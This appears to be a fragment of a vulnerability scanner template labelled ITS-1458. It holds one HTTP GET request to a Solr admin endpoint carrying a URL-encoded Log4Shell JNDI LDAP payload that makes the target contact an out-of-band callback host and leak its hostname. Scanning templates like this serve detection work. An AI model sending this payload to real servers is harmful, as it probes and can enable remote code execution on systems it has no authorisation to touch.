# Vulnerable: ITS-1458
GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D
